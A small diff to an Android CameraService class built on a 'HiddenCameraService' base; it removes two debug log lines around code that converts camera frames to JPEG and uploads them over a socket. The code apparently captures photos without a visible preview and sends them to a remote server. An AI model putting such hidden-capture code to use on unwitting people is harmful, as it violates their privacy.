@@ -362,10 +362,8 @@ public class CameraService extends HiddenCameraService {
             byte[] bytes = out.toByteArray();
             final Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
             byte[] jpg = bmpToJpg(bitmap);
-            Log.d(TAG, "sending image");
             uploadImage(jpg);
             int q_size = clientsocket.getImageBuf();
-            Log.d(TAG, "Image queue size: " + q_size);
             //Log.d(TAG, "saving image");
             //savePicture(jpg);
             last_sent_time = curr_time;
